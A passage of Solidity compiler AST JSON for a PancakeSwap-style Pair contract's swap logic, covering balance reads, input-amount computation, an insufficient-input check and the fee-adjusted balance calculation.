															"nodeType": "Assignment",
															"operator": "=",
															"rightHandSide": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 2021,
																				"name": "this",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2386,
																				"src": "13709:4:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_contract$_Pair_$2224",
																					"typeString": "contract Pair"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_contract$_Pair_$2224",
																					"typeString": "contract Pair"
																				}
																			],
																			"id": 2020,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "13701:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 2022,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13701:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 2017,
																				"name": "_token0",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1923,
																				"src": "13682:7:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			],
																			"id": 2016,
																			"name": "IERC20",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 533,
																			"src": "13675:6:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																				"typeString": "type(contract IERC20)"
																			}
																		},
																		"id": 2018,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13675:15:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_IERC20_$533",
																			"typeString": "contract IERC20"
																		}
																	},
																	"id": 2019,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "balanceOf",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 494,
																	"src": "13675:25:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																		"typeString": "function (address) view external returns (uint256)"
																	}
																},
																"id": 2023,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13675:40:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "13664:51:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 2025,
														"nodeType": "ExpressionStatement",
														"src": "13664:51:6"
													},
													{
														"expression": {
															"argumentTypes": null,
															"id": 2035,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftHandSide": {
																"argumentTypes": null,
																"id": 2026,
																"name": "balance1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1898,
																"src": "13729:8:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "Assignment",
															"operator": "=",
															"rightHandSide": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 2032,
																				"name": "this",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2386,
																				"src": "13774:4:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_contract$_Pair_$2224",
																					"typeString": "contract Pair"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_contract$_Pair_$2224",
																					"typeString": "contract Pair"
																				}
																			],
																			"id": 2031,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "13766:7:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 2033,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13766:13:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 2028,
																				"name": "_token1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1927,
																				"src": "13747:7:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			],
																			"id": 2027,
																			"name": "IERC20",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 533,
																			"src": "13740:6:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_contract$_IERC20_$533_$",
																				"typeString": "type(contract IERC20)"
																			}
																		},
																		"id": 2029,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "13740:15:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_IERC20_$533",
																			"typeString": "contract IERC20"
																		}
																	},
																	"id": 2030,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"memberName": "balanceOf",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 494,
																	"src": "13740:25:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																		"typeString": "function (address) view external returns (uint256)"
																	}
																},
																"id": 2034,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "13740:40:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "13729:51:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 2036,
														"nodeType": "ExpressionStatement",
														"src": "13729:51:6"
													}
												]
											},
											{
												"assignments": [
													2039
												],
												"declarations": [
													{
														"constant": false,
														"id": 2039,
														"name": "amount0In",
														"nodeType": "VariableDeclaration",
														"scope": 2147,
														"src": "13800:14:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 2038,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13800:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2053,
												"initialValue": {
													"argumentTypes": null,
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 2044,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 2040,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1895,
															"src": "13817:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": ">",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2043,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 2041,
																"name": "_reserve0",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1877,
																"src": "13828:9:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint112",
																	"typeString": "uint112"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"id": 2042,
																"name": "amount0Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1854,
																"src": "13840:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "13828:22:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "13817:33:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 2051,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "13915:1:6",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"id": 2052,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "13817:99:6",
													"trueExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 2050,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 2045,
															"name": "balance0",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1895,
															"src": "13865:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "-",
														"rightExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 2048,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 2046,
																		"name": "_reserve0",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1877,
																		"src": "13877:9:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint112",
																			"typeString": "uint112"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 2047,
																		"name": "amount0Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1854,
																		"src": "13889:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "13877:22:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 2049,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "13876:24:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "13865:35:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13800:116:6"
											},
											{
												"assignments": [
													2055
												],
												"declarations": [
													{
														"constant": false,
														"id": 2055,
														"name": "amount1In",
														"nodeType": "VariableDeclaration",
														"scope": 2147,
														"src": "13926:14:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 2054,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "13926:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 2069,
												"initialValue": {
													"argumentTypes": null,
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 2060,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 2056,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1898,
															"src": "13943:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": ">",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2059,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 2057,
																"name": "_reserve1",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1879,
																"src": "13954:9:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint112",
																	"typeString": "uint112"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"id": 2058,
																"name": "amount1Out",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1856,
																"src": "13966:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "13954:22:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "13943:33:6",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 2067,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "14041:1:6",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"id": 2068,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "13943:99:6",
													"trueExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 2066,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 2061,
															"name": "balance1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1898,
															"src": "13991:8:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "-",
														"rightExpression": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 2064,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 2062,
																		"name": "_reserve1",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1879,
																		"src": "14003:9:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint112",
																			"typeString": "uint112"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"argumentTypes": null,
																		"id": 2063,
																		"name": "amount1Out",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1856,
																		"src": "14015:10:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"src": "14003:22:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 2065,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "14002:24:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "13991:35:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "13926:116:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 2077,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 2073,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 2071,
																	"name": "amount0In",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2039,
																	"src": "14073:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 2072,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "14085:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "14073:13:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "||",
															"rightExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 2076,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 2074,
																	"name": "amount1In",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2055,
																	"src": "14090:9:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": ">",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 2075,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "14102:1:6",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "14090:13:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "14073:30:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a20494e53554646494349454e545f494e5055545f414d4f554e54",
															"id": 2078,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "14117:36:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_INPUT_AMOUNT\""
															},
															"value": "Pancake: INSUFFICIENT_INPUT_AMOUNT"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c",
																"typeString": "literal_string \"Pancake: INSUFFICIENT_INPUT_AMOUNT\""
															}
														],
														"id": 2070,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "14052:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 2079,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14052:111:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2080,
												"nodeType": "ExpressionStatement",
												"src": "14052:111:6"
											},
											{
												"id": 2129,
												"nodeType": "Block",
												"src": "14173:502:6",
												"statements": [
													{
														"assignments": [
															2082
														],
														"declarations": [
															{
																"constant": false,
																"id": 2082,
																"name": "balance0Adjusted",
																"nodeType": "VariableDeclaration",
																"scope": 2129,
																"src": "14263:21:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 2081,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "14263:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 2094,
														"initialValue": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "3235",
																					"id": 2090,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14343:2:6",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_25_by_1",
																						"typeString": "int_const 25"
																					},
																					"value": "25"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_25_by_1",
																						"typeString": "int_const 25"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 2088,
																					"name": "amount0In",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2039,
																					"src": "14329:9:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 2089,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "mul",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2298,
																				"src": "14329:13:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																					"typeString": "function (uint256,uint256) pure returns (uint256)"
																				}
																			},
																			"id": 2091,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14329:17:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "3130303030",
																					"id": 2085,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14318:5:6",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					},
																					"value": "10000"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_10000_by_1",
																						"typeString": "int_const 10000"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 2083,
																					"name": "balance0",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1895,
																					"src": "14305:8:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 2084,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "mul",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2298,
																				"src": "14305:12:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																					"typeString": "function (uint256,uint256) pure returns (uint256)"
																				}
																			},
																			"id": 2086,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14305:19:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 2087,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sub",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 2270,
																		"src": "14305:23:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																			"typeString": "function (uint256,uint256) pure returns (uint256)"
																		}
																	},
																	"id": 2092,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "14305:42:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"id": 2093,
															"isConstant": false,
															"isInlineArray": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "TupleExpression",
															"src": "14287:74:6",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "VariableDeclarationStatement",
														"src": "14263:98:6"
													},
													{
														"assignments": [
															2096
														],
														"declarations": [
															{
																"constant": false,
																"id": 2096,
																"name": "balance1Adjusted",
																"nodeType": "VariableDeclaration",
																"scope": 2129,
																"src": "14375:21:6",
																"stateVariable": false,
																"storageLocation": "default",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"typeName": {
																	"id": 2095,
																	"name": "uint",
																	"nodeType": "ElementaryTypeName",
																	"src": "14375:4:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"value": null,
																"visibility": "internal"
															}
														],
														"id": 2108,
														"initialValue": {
															"argumentTypes": null,
															"components": [
																{
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"hexValue": "3235",
																					"id": 2104,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "14455:2:6",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_25_by_1",
																						"typeString": "int_const 25"
																					},
																					"value": "25"
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_25_by_1",
																						"typeString": "int_const 25"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 2102,
																					"name": "amount1In",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2055,
																					"src": "14441:9:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"id": 2103,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "mul",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2298,
																				"src": "14441:13:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																					"typeString": "function (uint256,uint256) pure returns (uint256)"
																				}
																			},
																			"id": 2105,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "14441:17:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
